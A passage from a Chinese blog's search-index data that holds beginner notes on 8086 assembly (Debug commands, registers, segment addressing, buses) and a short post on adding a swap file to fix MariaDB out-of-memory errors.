Windows下的Debug 在Windows下自带提供了Debug，可以直接通过Window提供的DOS进入到Debug，可以通过开始命令，输入cmd然后进入到DOS界面后直接输入Debug后就进行Debug程序了。\nMac下的Debug 在Mac下，你需要通过Boxer这个程序来模拟DOS环境，打开后类似于这样的界面：\n点击Open a DOS prompt后就会弹出如下的界面，可以在这个环境下使用任何的DOS界面：\n但是这个DOS环境只包含了最基础的DOS环境，所以这个DOS环境是不带Debug程序的，你需要下载一个Debug程序或者下载由我提供的一个学习汇编需要的程序包，然后解压后把这个文件夹拖放进DOS窗口后，你就会看见Boxer提供的DOS环境会自动把这个目录加载成C盘，这样就可以正常使用Debug程序了，类似于下图这样：\n进入界面后，你会看见一个\u0026quot;-\u0026ldquo;后面跟着闪烁的下划线，说明已经进入Debug。\nR命令 R命令有两个作用：\n查看当前CPU的各个寄存器状态、以及当前CS、IP指向的代码以及机器指令翻译后的汇编指令。 修改各个寄存器的内容 输入r后，会返回当前CPU的各个寄存器状态，就如下图这样：\n如果需要修改某个寄存器的内容，可以通过r命令后跟一个寄存器的命令，比如r ax，输入后会返回一个ax当前寄存器的内容，然后会有一个提示符:等待输入，比如下图中，通过r ax命令设置ax的内容为1000H：\nD命令 通过下面的格式可以查看需要的内容中的内容：\nd 段地址:偏移地址 比如下图用d命令查看内容20000H处的内容：\n返回的内容中包含了三个显示部分：\n第一部分位于最左边类似于2000:0000，是每行开始的第一个内存单元的段地址和偏移地址。 第二部分位于中间的十六进制编码，是开始部分的内存单元一直显示128个内存单元的内容，而每行等于16个字节，注意在每行在第八个内存单元的后面会有一个-来分割，有利于我们辨识。 第三部分位于最右边，是每个内存单元中的数据可以对应显示的ASCII，如果没有对应的ASCII码，就会用.代替。 还有一种限制D命令输出的方式，可以通过使用结束偏移地址来限制D命令的返回结果，它的格式为：\nd 段地址:偏移地址 结束偏移地址 比如下图中只需要返回内存地址为2000:0000到2000:0009的十个内存单元的内容：\nE命令 e 段地址:偏移地址 可以通过E命令来改写内存中的内容，不管是汇编指令还是数据。\n通过E命令可以连续更改也可以更改一个内存单元，当修改指定内存单元的内容时，会把当前内存单元的内容显示出来，然后用一个.号连接需要写入的数据，比如需要修改内存单元20000H的内容为10，然后再用d命令查看修改后的内容：\n当然也可以连续修改指定内存单元后的连续内存单元中的内容，只需要在输入需要写入的内存单元后按空格间，会自动跳到下一个内存单元进行修改，直到按回车键，就会写入内存：\nU命令 u命令会将某一段内存单元中的内容翻译成汇编指令，并返回16个内存单元的内容，返回的内容中包含三部分：\n每一条机器指令的地址 对应的机器指令 对应的汇编指令 比如查看内存单元2000:0000的数据，并翻译成汇编指令：\n当然也可以限制返回的内容，比如下面返回内存单元2000:0000到内存单元2000:0009的汇编指令：\n这里需要注意的是在计算机中储存在内存单元中的不管是数据还是代码，都是以二进制形式储存的，所以是代码还是数据，得看程序员怎么去控制。\nT命令 T命令是执行当前CS和IP指向的内存单元中的汇编指令，执行后IP自动增加代码长度并正确的指向到下一个代码的内存单元：\nA命令 以汇编指令的方式写入到内存单元，格式为：\na 段地址:偏移地址 当指定修改某一个内存单元的内容时，会显示出当前修改的内存单元地址，并等待输入汇编指令，当输入完成后会自动跳到上一条代码长度后的内存单元继续等待输入，如果不想继续写入汇编指令，按回车键就结束写入。\n比如下图中，通过在内存单元20000H处以汇编指令形式写入：\nmov ax,20 并通过u命令查看内存单元20000H处是否写入成功：\n并且再通过r命令查看当前AX寄存器的内容，然后修改CS和IP寄存器，让CPU代码指针指向20000H处\n然后用t命令执行，再次查看AX寄存器的结果：","title":"汇编语言学习笔记（三）：初识Debug"},{"content":"为什么要了解寄存器 为什么了解寄存器？因为CPU是计算机的大脑，可以通过指令读写寄存器实现对CPU的控制，你试想一下如果你的大脑不能控制只能控制手和脚等，不就等于扯线木偶了？\n寄存器只是CPU内部的一个器件，对于汇编来说CPU中比较重要的三个器件：\n运算器：对数据进行处理 控制器：控制各种器件工作 寄存器：对数据进行储存 而在CPU内部，这三个器件包括其他器件都是靠CPU内部总线相连，这里的内部总线是指的CPU内部器件的总线，而上一章节说的总线是CPU与外部器件比如显卡、内存等器件的总线。\n8086CPU 每个CPU寄存器和结构都是不相同的，而王爽《汇编语言》第三版主要讲的是在8086CPU上面操作的汇编，所以我这个笔记(教程)也是跟着王爽《汇编语言》第三版这本书学习。\n在8086CPU中有14个寄存器，并且每个寄存器都是16位(2Byte)，每个寄存器的名字不一样，这些寄存器的名字分别为：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。而关于这些寄存器的作用，需要用的时候再去理解，现在就当认识一下啦～\n通用寄存器 AX、BX、CX、DX这四个寄存器可以来存放一般的数据，所以通常称为通用寄存器。以AX寄存器为例，寄存器的逻辑结构为下图：\n8086CPU每个寄存器都是16位，2而8086上一代CPU的寄存器为8位，所以8086CPU为了保证兼容性，AX、BX、CX、DX这四个寄存器都可以分为两个独立的8位寄存器来使用。\nAX可分为：AH和AL BX可分为：BH和BL CX可分为：CH和CL DX可分为：DH和DL 而这些命名也是有规律的，AH表示AX寄存器的高8位，AL表示AX寄存器的低8位。以AX为例，AX寄存器分为两个独立8为寄存器的逻辑结构为下图：\n为了保证兼容性8086CPU同时也可以处理两种尺寸的数据：\n字节：byte，一个字节由8个bit组成，可以存放在8位寄存器中，比如AH、AL 字：word，一个字由两个字节组成，可以直接放在16位寄存器中，比如AX 下图是数据20000(十六进制为4E20H)保存在寄存器AX当中的示意图：\n如果把AX寄存器当作一个整体看，那么里面的值就是字型数据20000(4E20H)，如果把寄存器分成两个8位寄存器看，那么AH就是字节型数据78(4EH)，而AL就是字节型数据32(20H)。\n几条汇编指令 通过下面几条简单的汇编指令来熟悉一下汇编指令，至于其他的一些汇编指令会在后期介绍。下面表中会列出汇编指令和相应的指令含义。\n在汇编语言当中，如果你操作寄存器的时候需要运算的字节大小超过了寄存器能存储的大小，CPU会抛弃高位(但是CPU并不是真正的丢弃这个值，后面会说到为什么)，保留相应的低位，什么意思呢？比如下面的汇编指令：\nmov ah,88H add ah,ah 上面代码运算后的结果为110H，但是因为操作的是8位寄存器，也就是只能保存两个16进制(16进制一个位等于4位二进制，两个16进制等于8位二进制)，所以这里CPU丢去了高位1H，保留了10H。而这种情况同样在16位中也会有。\n16位结构的CPU 之前提到过8086CPU上一代CPU是8位CPU，而8086CPU是16位CPU，那么什么是16位CPU？什么是8位CPU？有三个方面来描述CPU的结构特性：\n运算器最多一次性可以计算16位数据 寄存器最多一次性能存储16位数据 寄存器和运算器之间最多一次性能传输16位数据 **通过上面简单的说，就是说8086CPU能一次性处理、传输、暂存信息的长度为16位。**那32位计算机呢？同样是一次性处理、传输、暂存信息的长度为32位。\n物理地址 在上一章节说过CPU会把所有储存器看成一个一维线性空间，每个储存器在这个空间中都有自己的地址，我们将这个地址称为物理地址，比如就像下图一样：\n而CPU访问存储器的时候是通过地址总线来寻址的，而寻址必须通过物理地址来寻址。\n在CPU向地址总线发出物理地址之前需要先在内部形成这个一维的线性空间，那么物理地址是怎样形成的呢？不同的CPU可以有不同的形成物理地址的方式，下面来讨论一下8086CPU形成物理地址的方式。\n8086CPU给出物理地址的方法 8086CPU有20位地址总线用于相连外部的存储器，最多可以传输20位地址。在将物理地址发出到地址总线寻址之前，必须在CPU中处理、传输、暂存，而8086CPU是16位结构的CPU，意味着8086只能一次性发出16位的地址，也意味着只有64KB的寻址能力，所以8086CPU在设计上采用了用两个16位地址来合成20位的物理地址的方法。\n它的大概实现就是由CPU的相关部件提供两个16位地址，一个为段地址，一个为偏移地址，他们通过CPU内部的一个地址加法器计算这个地址得到一个20位的物理地址，然后通过CPU内部的地址总线传输到地址总线上进行寻址，比如下图：\n而这个地址加法器采用的计算方式是物理地址=基础地址(段地址X16)+偏移地址，比如8086CPU要访问123C8H内存单元的时候，地址加法器的工作流程大致如下：\n关于这样的计算方式，还有一种更为常见的说法是左移4位，因为上面的物理地址都是用16进制表示的，而一位16进制等于4位二进制。在计算机存储的任何信息都是以二进制存放的，所以这里指的左移4位，是指的二进制左移4位，而二进制左移4位相当于16进制X16，相当于10进制的该数乘以2的4次方，下图中可以很好的对比数据：\n比如我们要访问一个内存单元，用描述来说“数据在21F60H当中”，这句话对于8086PC机一般不这样描述，一般用两种说法表示：\n数据存在内存2000:1F60单元中 数据存在内存的2000段中的1F60单元中 段的概念 说到段，可能都会误认为储存器是分为一段一段的，实际上不是，因为CPU把所有的储存器看作一个一维的线性空间，所以CPU把所有的储存器看作的都是一个整体。\n而这个划分来自于CPU的寻址方式，因为8086CPU用的是“基础地址(段地址X16+偏移地址)”得到的，所以使我们可以分段的管理这些内存，但是需要知道的是段地址X16必然是16的倍数，而偏移地址位16位，所以一个段最大长度为64KB，比如下图中表示的两个“段”：\n在这个之前提到过，段地址是由相关部件提供的，这个部件也是寄存器，但是它只用来存放段地址，所以称为段寄存器，在8086中有4个段寄存器，分别有4个：CS、DS、SS、ES。当8086CPU要访问内存时，由这4个段寄存器提供内存单位的段地址，这里先看看CS。\nCS段寄存器和IP指令指针寄存器 因为在计算机中储存的数据都是二进制，计算机并不知道这些二进制是代码还是数据，所以数据和代码是完全由程序员说了算，而怎么来让计算机知道这是代码？这是数据？通过CS和IP寄存器。\nCS和IP是8086CPU中最为关键的两个寄存器，这两个寄存器指示了CPU当前要读取的指令地址。\nCS为代码段寄存器，IP为指令指针寄存器，在8086CPU中通过CSX16+IP得到需读取执行的代码，当每次执行代码后IP的值会自动加上当前已经读取执行的代码长度，以使CPU可以正确的执行一下一条命令。\n所以CS和IP是表示的CPU任意时刻当前需要读取执行的代码，下图中是一个CPU读取执行代码的过程：\n在8086CPU加电或复位后（即CPU刚开始工作的时候）CS和IP被设置为CS=FFFFH，IP=0000H，也就是说8086PC机刚启动的时候，FFFF0H内存单元中的指令是8086PC机启动后执行的第一条指令。\n修改CS和IP 程序员可以通过修改CS、IP到达控制CPU执行哪一段代码，我们之前可以通过传送指令MOV来修改通用寄存器，但是传送指令MOV并不能来修改CS、IP寄存器，而8086CPU提供了另外的指令来改变CS、IP的值，这一类指令我们统称为转移指令。\njmp指令就是一条简单的转移指令，它的作用是用指令修改当前CPU需要执行的代码内存单元地址，通过修改CS的段地址以及IP的偏移地址。它的使用方法是：\njmp 段地址:偏移地址 它可以直接修改CS和IP寄存器的值，比如下面这样：\njmp 2AE3:3，执行后：CS=2AE3H，IP=0003H，CPU将从内存单元2AE33H执行指令。 jmp 3:0B16，执行后：CS=0003H，IP=0B16H，CPU将从内存单元00B46H执行指令。 我们也可以只修改IP偏移地址：\njmp ax 执行后把ax中的数据传送到IP寄存器中 执行前：ax=1000H,CS=2000H,IP=0000H 执行后：ax=1000H,CS=2000H,IP=1000H jmp bx 执行后把bx中的数据传送到IP寄存器中 执行前：bx=3000H,CS=2000H,IP=0000H 执行后：bx=3000H,CS=2000H,IP=3000H 8086CPU工作过程 从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲区 IP指向下一条指令 执行指令（转到步骤1，重复过程） ","permalink":"/posts/learning-assembly-2/","summary":"为什么要了解寄存器 为什么了解寄存器？因为CPU是计算机的大脑，可以通过指令读写寄存器实现对CPU的控制，你试想一下如果你的大脑不能控制只能控制手和脚等，不就等于扯线木偶了？\n寄存器只是CPU内部的一个器件，对于汇编来说CPU中比较重要的三个器件：\n运算器：对数据进行处理 控制器：控制各种器件工作 寄存器：对数据进行储存 而在CPU内部，这三个器件包括其他器件都是靠CPU内部总线相连，这里的内部总线是指的CPU内部器件的总线，而上一章节说的总线是CPU与外部器件比如显卡、内存等器件的总线。\n8086CPU 每个CPU寄存器和结构都是不相同的，而王爽《汇编语言》第三版主要讲的是在8086CPU上面操作的汇编，所以我这个笔记(教程)也是跟着王爽《汇编语言》第三版这本书学习。\n在8086CPU中有14个寄存器，并且每个寄存器都是16位(2Byte)，每个寄存器的名字不一样，这些寄存器的名字分别为：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。而关于这些寄存器的作用，需要用的时候再去理解，现在就当认识一下啦～\n通用寄存器 AX、BX、CX、DX这四个寄存器可以来存放一般的数据，所以通常称为通用寄存器。以AX寄存器为例，寄存器的逻辑结构为下图：\n8086CPU每个寄存器都是16位，2而8086上一代CPU的寄存器为8位，所以8086CPU为了保证兼容性，AX、BX、CX、DX这四个寄存器都可以分为两个独立的8位寄存器来使用。\nAX可分为：AH和AL BX可分为：BH和BL CX可分为：CH和CL DX可分为：DH和DL 而这些命名也是有规律的，AH表示AX寄存器的高8位，AL表示AX寄存器的低8位。以AX为例，AX寄存器分为两个独立8为寄存器的逻辑结构为下图：\n为了保证兼容性8086CPU同时也可以处理两种尺寸的数据：\n字节：byte，一个字节由8个bit组成，可以存放在8位寄存器中，比如AH、AL 字：word，一个字由两个字节组成，可以直接放在16位寄存器中，比如AX 下图是数据20000(十六进制为4E20H)保存在寄存器AX当中的示意图：\n如果把AX寄存器当作一个整体看，那么里面的值就是字型数据20000(4E20H)，如果把寄存器分成两个8位寄存器看，那么AH就是字节型数据78(4EH)，而AL就是字节型数据32(20H)。\n几条汇编指令 通过下面几条简单的汇编指令来熟悉一下汇编指令，至于其他的一些汇编指令会在后期介绍。下面表中会列出汇编指令和相应的指令含义。\n在汇编语言当中，如果你操作寄存器的时候需要运算的字节大小超过了寄存器能存储的大小，CPU会抛弃高位(但是CPU并不是真正的丢弃这个值，后面会说到为什么)，保留相应的低位，什么意思呢？比如下面的汇编指令：\nmov ah,88H add ah,ah 上面代码运算后的结果为110H，但是因为操作的是8位寄存器，也就是只能保存两个16进制(16进制一个位等于4位二进制，两个16进制等于8位二进制)，所以这里CPU丢去了高位1H，保留了10H。而这种情况同样在16位中也会有。\n16位结构的CPU 之前提到过8086CPU上一代CPU是8位CPU，而8086CPU是16位CPU，那么什么是16位CPU？什么是8位CPU？有三个方面来描述CPU的结构特性：\n运算器最多一次性可以计算16位数据 寄存器最多一次性能存储16位数据 寄存器和运算器之间最多一次性能传输16位数据 **通过上面简单的说，就是说8086CPU能一次性处理、传输、暂存信息的长度为16位。**那32位计算机呢？同样是一次性处理、传输、暂存信息的长度为32位。\n物理地址 在上一章节说过CPU会把所有储存器看成一个一维线性空间，每个储存器在这个空间中都有自己的地址，我们将这个地址称为物理地址，比如就像下图一样：\n而CPU访问存储器的时候是通过地址总线来寻址的，而寻址必须通过物理地址来寻址。\n在CPU向地址总线发出物理地址之前需要先在内部形成这个一维的线性空间，那么物理地址是怎样形成的呢？不同的CPU可以有不同的形成物理地址的方式，下面来讨论一下8086CPU形成物理地址的方式。\n8086CPU给出物理地址的方法 8086CPU有20位地址总线用于相连外部的存储器，最多可以传输20位地址。在将物理地址发出到地址总线寻址之前，必须在CPU中处理、传输、暂存，而8086CPU是16位结构的CPU，意味着8086只能一次性发出16位的地址，也意味着只有64KB的寻址能力，所以8086CPU在设计上采用了用两个16位地址来合成20位的物理地址的方法。\n它的大概实现就是由CPU的相关部件提供两个16位地址，一个为段地址，一个为偏移地址，他们通过CPU内部的一个地址加法器计算这个地址得到一个20位的物理地址，然后通过CPU内部的地址总线传输到地址总线上进行寻址，比如下图：\n而这个地址加法器采用的计算方式是物理地址=基础地址(段地址X16)+偏移地址，比如8086CPU要访问123C8H内存单元的时候，地址加法器的工作流程大致如下：\n关于这样的计算方式，还有一种更为常见的说法是左移4位，因为上面的物理地址都是用16进制表示的，而一位16进制等于4位二进制。在计算机存储的任何信息都是以二进制存放的，所以这里指的左移4位，是指的二进制左移4位，而二进制左移4位相当于16进制X16，相当于10进制的该数乘以2的4次方，下图中可以很好的对比数据：\n比如我们要访问一个内存单元，用描述来说“数据在21F60H当中”，这句话对于8086PC机一般不这样描述，一般用两种说法表示：\n数据存在内存2000:1F60单元中 数据存在内存的2000段中的1F60单元中 段的概念 说到段，可能都会误认为储存器是分为一段一段的，实际上不是，因为CPU把所有的储存器看作一个一维的线性空间，所以CPU把所有的储存器看作的都是一个整体。\n而这个划分来自于CPU的寻址方式，因为8086CPU用的是“基础地址(段地址X16+偏移地址)”得到的，所以使我们可以分段的管理这些内存，但是需要知道的是段地址X16必然是16的倍数，而偏移地址位16位，所以一个段最大长度为64KB，比如下图中表示的两个“段”：\n在这个之前提到过，段地址是由相关部件提供的，这个部件也是寄存器，但是它只用来存放段地址，所以称为段寄存器，在8086中有4个段寄存器，分别有4个：CS、DS、SS、ES。当8086CPU要访问内存时，由这4个段寄存器提供内存单位的段地址，这里先看看CS。\nCS段寄存器和IP指令指针寄存器 因为在计算机中储存的数据都是二进制，计算机并不知道这些二进制是代码还是数据，所以数据和代码是完全由程序员说了算，而怎么来让计算机知道这是代码？这是数据？通过CS和IP寄存器。\nCS和IP是8086CPU中最为关键的两个寄存器，这两个寄存器指示了CPU当前要读取的指令地址。\nCS为代码段寄存器，IP为指令指针寄存器，在8086CPU中通过CSX16+IP得到需读取执行的代码，当每次执行代码后IP的值会自动加上当前已经读取执行的代码长度，以使CPU可以正确的执行一下一条命令。\n所以CS和IP是表示的CPU任意时刻当前需要读取执行的代码，下图中是一个CPU读取执行代码的过程：\n在8086CPU加电或复位后（即CPU刚开始工作的时候）CS和IP被设置为CS=FFFFH，IP=0000H，也就是说8086PC机刚启动的时候，FFFF0H内存单元中的指令是8086PC机启动后执行的第一条指令。\n修改CS和IP 程序员可以通过修改CS、IP到达控制CPU执行哪一段代码，我们之前可以通过传送指令MOV来修改通用寄存器，但是传送指令MOV并不能来修改CS、IP寄存器，而8086CPU提供了另外的指令来改变CS、IP的值，这一类指令我们统称为转移指令。\njmp指令就是一条简单的转移指令，它的作用是用指令修改当前CPU需要执行的代码内存单元地址，通过修改CS的段地址以及IP的偏移地址。它的使用方法是：\njmp 段地址:偏移地址 它可以直接修改CS和IP寄存器的值，比如下面这样：\njmp 2AE3:3，执行后：CS=2AE3H，IP=0003H，CPU将从内存单元2AE33H执行指令。 jmp 3:0B16，执行后：CS=0003H，IP=0B16H，CPU将从内存单元00B46H执行指令。 我们也可以只修改IP偏移地址：","title":"汇编语言学习笔记（二）：寄存器"},{"content":"前言 此文章如出现歧义或错误的地方请谅解，这篇文章是我在学习汇编的时候同时记录下来的笔记，然后通过教程的方式发表出来，因为通过这样的方式发表出来，可以锻炼自己的语言组织能力，并且能够把问题思考懂了，然后再通过初学者的角度来记录这片文章，从而巩固自己的知识。如果有任何错误歧义的地方，可以通过邮箱与我取得联系。\n为什么学习汇编？ 首先在现在用汇编语言来写用户层面上的应用是很少的了，当然也有一些应用比如驱动、boot loader等。既然已经很少有人用汇编写用户层面的应用了，但是为什么要学习？因为汇编语言是作用于硬件上工作的语言，有便于理解计算机工作的原理，以后学习高级语言更为有利，特别是对于反汇编、破解这一块的技术对汇编语言的学习是必须的。\n机器语言 机器语言，顾名思义就是机器能看懂的语言，因为计算机智能看懂0和1，通电为1，没有通电为0，所以机器语言就是0和1组成的，也就是二进制。比如：01010000。\n汇编语言 而汇编语言就是机器语言的一种表达方式，便于程序员更好的去记忆理解。比如机器码为01010000对应的汇编指令就是PUSH AX。\n汇编语言包含两个部分：汇编指令、编译器指令（比如符号运算、伪指令等）。\n计算机是没有办法计算加减乘除运算符的，而加减乘除是通过编译器转换成计算机能够识别的逻辑运算符（或、与、非），然后利用这些逻辑运算符的组合达到加减乘除的一个效果。\n编译器 编译器的作用就是把汇编语言转换成机器能够识别的机器语言，可以大概理解编译器就是一个扫描仪，把汇编语言的指令对应相应的机器码翻译出来。\n它们大致的关系是：程序员编写汇编语言通过编译器转换汇编语言为机器语言后交给计算机执行。\n存储器 首先来了解存储器，为什么要了解存储器，因为学习汇编就是操作CPU与这些存储器进行交换数据，存储器不止是硬盘，CPU内部也有存储器、内存、bios、显卡都是存储器，每个存储单元可以存储1字节(Byte)，也就是等于8bit。而每个存储器都会被划分为若干个存储单元，而所有的储存单元都会被CPU看成是一个内存，比如01开始是BIOS，05开始是显卡等。，比如下图：\n内存是一个计算机仅次于CPU的硬件的，CPU无法直接读取硬盘中的数据，而是内存读取硬盘的数据后，CPU从内存中读取的。\n在*NIX系统中经常会看见一个叫swap的交换文件，这个文件就是虚拟内存，它的作用就是当内存满了后，把暂时不用的数据放在这个交换文件中，当你需要读取这部分数据的时候，内存会再次从虚拟内存中加载数据到内存中，所以从虚拟内存中实际上等于从硬盘加载数据，所以速度比较慢。\n指令和数据 指令和数据对于计算机来说都是一堆0和1，比如下面的一串机器码：\n1000100111011000：等于89D8H\n1000100111011000：等于MOV AX,BX\n上面两个同样的机器码确表达出了不同的意思，那么计算机如何来分辨我们这串机器码到底是数据还是指令？这个完全由我们来决定它是指令还是数据。\nCPU对存储器的读写 首先CPU与其他芯片都有电路线连接，而这些电路线一般称为总线，总线又分为三种，分别为：地址总线、控制总线、数据总线。而这三类总线，是CPU与其他芯片通讯的重要部件。\nCPU想要对存储器进行读写，必须通过三类通讯的交互，而这三类通讯是通过上面不同的总线进行通讯的：\n地址信息：如果不清楚储存单元的地址，就随便找一个，有可能把需要从bios中读取的数据变为从显卡中读取了。\n读写信息：通过读写信息，CPU才知道是读取指定地址的数据还是写入指定地址数据。\n数据信息：当上面两部分完成了，那么如果是读，就读取数据，如果是写就写入数据。\n知道了CPU如何进行数据的读写，而该去怎么操作计算机去执行这步的操作？通过机器码，比如：\nMOV AX,[3]\n翻译成机器码就等于：\n10100001 00000011 00000000\n当CPU接收到这条机器码就会执行我们上面代码所代表的操作。\n地址总线 CPU通过地址总线来对存储器进行寻址，比如要从03储存单元读取数据，那么地址总线上面传输的信息为：00000011。从这里就能知道如果地址总线越多表示的不同数字就越多，CPU寻址的范围就越大，因为一根地址总线可以表示0和1两种信息，那10根地址总线，寻址的就是2的10次方，等于1024，因为计算器从0开始计算，所以最小能表示0个，最大能表示1023个。\n数据总线 而数据总线有多少根也决定了CPU与其他存储器的传输能力，8088CPU数据总线有8根，所以一次性能传输8个二进制位，8086CPU数据总线有16根，所以一次性可以传输16个二进制位。\n比如要传输一个8D9AH数据，8088CPU需要分两次传输，第一次传输8D，第二次传输9A。而8086CPU只需要传输一次8D9A。所以数据总线的根数决定了数据的传输速度。\n控制总线 控制总线有多少根也决定了CPU对于储存器的控制能力，而需要注意的是控制总线指的是一个总称，控制总线是由几根不同的控制线构成的。\n而当读取信息的时候控制总线中有一个专门负责读取信号的控制线有低电平的时候表示读取。\n而写入数据的时候，同样控制总线中也有一根专门负责写入信号的控制线，当向它输出低电平的时候表示写入。\n","permalink":"/posts/learning-assembly-1/","summary":"前言 此文章如出现歧义或错误的地方请谅解，这篇文章是我在学习汇编的时候同时记录下来的笔记，然后通过教程的方式发表出来，因为通过这样的方式发表出来，可以锻炼自己的语言组织能力，并且能够把问题思考懂了，然后再通过初学者的角度来记录这片文章，从而巩固自己的知识。如果有任何错误歧义的地方，可以通过邮箱与我取得联系。\n为什么学习汇编？ 首先在现在用汇编语言来写用户层面上的应用是很少的了，当然也有一些应用比如驱动、boot loader等。既然已经很少有人用汇编写用户层面的应用了，但是为什么要学习？因为汇编语言是作用于硬件上工作的语言，有便于理解计算机工作的原理，以后学习高级语言更为有利，特别是对于反汇编、破解这一块的技术对汇编语言的学习是必须的。\n机器语言 机器语言，顾名思义就是机器能看懂的语言，因为计算机智能看懂0和1，通电为1，没有通电为0，所以机器语言就是0和1组成的，也就是二进制。比如：01010000。\n汇编语言 而汇编语言就是机器语言的一种表达方式，便于程序员更好的去记忆理解。比如机器码为01010000对应的汇编指令就是PUSH AX。\n汇编语言包含两个部分：汇编指令、编译器指令（比如符号运算、伪指令等）。\n计算机是没有办法计算加减乘除运算符的，而加减乘除是通过编译器转换成计算机能够识别的逻辑运算符（或、与、非），然后利用这些逻辑运算符的组合达到加减乘除的一个效果。\n编译器 编译器的作用就是把汇编语言转换成机器能够识别的机器语言，可以大概理解编译器就是一个扫描仪，把汇编语言的指令对应相应的机器码翻译出来。\n它们大致的关系是：程序员编写汇编语言通过编译器转换汇编语言为机器语言后交给计算机执行。\n存储器 首先来了解存储器，为什么要了解存储器，因为学习汇编就是操作CPU与这些存储器进行交换数据，存储器不止是硬盘，CPU内部也有存储器、内存、bios、显卡都是存储器，每个存储单元可以存储1字节(Byte)，也就是等于8bit。而每个存储器都会被划分为若干个存储单元，而所有的储存单元都会被CPU看成是一个内存，比如01开始是BIOS，05开始是显卡等。，比如下图：\n内存是一个计算机仅次于CPU的硬件的，CPU无法直接读取硬盘中的数据，而是内存读取硬盘的数据后，CPU从内存中读取的。\n在*NIX系统中经常会看见一个叫swap的交换文件，这个文件就是虚拟内存，它的作用就是当内存满了后，把暂时不用的数据放在这个交换文件中，当你需要读取这部分数据的时候，内存会再次从虚拟内存中加载数据到内存中，所以从虚拟内存中实际上等于从硬盘加载数据，所以速度比较慢。\n指令和数据 指令和数据对于计算机来说都是一堆0和1，比如下面的一串机器码：\n1000100111011000：等于89D8H\n1000100111011000：等于MOV AX,BX\n上面两个同样的机器码确表达出了不同的意思，那么计算机如何来分辨我们这串机器码到底是数据还是指令？这个完全由我们来决定它是指令还是数据。\nCPU对存储器的读写 首先CPU与其他芯片都有电路线连接，而这些电路线一般称为总线，总线又分为三种，分别为：地址总线、控制总线、数据总线。而这三类总线，是CPU与其他芯片通讯的重要部件。\nCPU想要对存储器进行读写，必须通过三类通讯的交互，而这三类通讯是通过上面不同的总线进行通讯的：\n地址信息：如果不清楚储存单元的地址，就随便找一个，有可能把需要从bios中读取的数据变为从显卡中读取了。\n读写信息：通过读写信息，CPU才知道是读取指定地址的数据还是写入指定地址数据。\n数据信息：当上面两部分完成了，那么如果是读，就读取数据，如果是写就写入数据。\n知道了CPU如何进行数据的读写，而该去怎么操作计算机去执行这步的操作？通过机器码，比如：\nMOV AX,[3]\n翻译成机器码就等于：\n10100001 00000011 00000000\n当CPU接收到这条机器码就会执行我们上面代码所代表的操作。\n地址总线 CPU通过地址总线来对存储器进行寻址，比如要从03储存单元读取数据，那么地址总线上面传输的信息为：00000011。从这里就能知道如果地址总线越多表示的不同数字就越多，CPU寻址的范围就越大，因为一根地址总线可以表示0和1两种信息，那10根地址总线，寻址的就是2的10次方，等于1024，因为计算器从0开始计算，所以最小能表示0个，最大能表示1023个。\n数据总线 而数据总线有多少根也决定了CPU与其他存储器的传输能力，8088CPU数据总线有8根，所以一次性能传输8个二进制位，8086CPU数据总线有16根，所以一次性可以传输16个二进制位。\n比如要传输一个8D9AH数据，8088CPU需要分两次传输，第一次传输8D，第二次传输9A。而8086CPU只需要传输一次8D9A。所以数据总线的根数决定了数据的传输速度。\n控制总线 控制总线有多少根也决定了CPU对于储存器的控制能力，而需要注意的是控制总线指的是一个总称，控制总线是由几根不同的控制线构成的。\n而当读取信息的时候控制总线中有一个专门负责读取信号的控制线有低电平的时候表示读取。\n而写入数据的时候，同样控制总线中也有一根专门负责写入信号的控制线，当向它输出低电平的时候表示写入。","title":"汇编语言学习笔记（一）：基础知识"},{"content":"之前自己写的一篇关于搭建lamp的文章，在运行过程中会出现一些莫名其妙的错误导致mariadb错误，然后必须手动重启mariadb才能正常启动服务。\n于是在mariadb的日志文件中查看到错误信息，/var/log/mariadb/mariadb。\n171002 10:56:34 [ERROR] Plugin \u0026#39;InnoDB\u0026#39; init function returned error. 171002 10:56:34 [ERROR] Plugin \u0026#39;InnoDB\u0026#39; registration as a STORAGE ENGINE failed. 171002 10:56:34 [ERROR] mysqld: Out of memory (Needed 128917504 bytes) 171002 10:56:34 [Note] Plugin \u0026#39;FEEDBACK\u0026#39; is disabled. 171002 10:56:34 [ERROR] Unknown/unsupported storage engine: InnoDB 171002 10:56:34 [ERROR] Aborting 其中有一句Out of memory (Needed 128917504 bytes)，看来是内存不足导致的错误，因为我的服务器是阿里云的低配服务器，所以当其他服务占用了很多内存之后，导致mariadb没有足够的内存提供服务。\n因为自己的内存是512M，于是想到采用swap空间。查看swap的大小是free -m返回的信息是：\ntotal used free shared buff/cache available Mem: 992 315 331 0 344 525 Swap: 0 0 0 看来swap也没有建立，那么就手动建立一个swap文件，由于官方给的swap大小建议的是实际内存的2倍，所以我在这里就建立了一个1GB的swap交换文件。\ndd if=/dev/zero of=/swapfile bs=1024 count=1048576 配置swap\nmkswap /swapfile 启动swap\nswapon /swapfile 最后你可以通过free -m命令来查看是否成功建立swap交换分区。\n文完\n","permalink":"/posts/mariadb-swap/","summary":"之前自己写的一篇关于搭建lamp的文章，在运行过程中会出现一些莫名其妙的错误导致mariadb错误，然后必须手动重启mariadb才能正常启动服务。\n于是在mariadb的日志文件中查看到错误信息，/var/log/mariadb/mariadb。\n171002 10:56:34 [ERROR] Plugin \u0026#39;InnoDB\u0026#39; init function returned error. 171002 10:56:34 [ERROR] Plugin \u0026#39;InnoDB\u0026#39; registration as a STORAGE ENGINE failed. 171002 10:56:34 [ERROR] mysqld: Out of memory (Needed 128917504 bytes) 171002 10:56:34 [Note] Plugin \u0026#39;FEEDBACK\u0026#39; is disabled. 171002 10:56:34 [ERROR] Unknown/unsupported storage engine: InnoDB 171002 10:56:34 [ERROR] Aborting 其中有一句Out of memory (Needed 128917504 bytes)，看来是内存不足导致的错误，因为我的服务器是阿里云的低配服务器，所以当其他服务占用了很多内存之后，导致mariadb没有足够的内存提供服务。\n因为自己的内存是512M，于是想到采用swap空间。查看swap的大小是free -m返回的信息是：\ntotal used free shared buff/cache available Mem: 992 315 331 0 344 525 Swap: 0 0 0 看来swap也没有建立，那么就手动建立一个swap文件，由于官方给的swap大小建议的是实际内存的2倍，所以我在这里就建立了一个1GB的swap交换文件。","title":"MariaDB swap空间没有配置导致的出错问题"},{"content":"前言 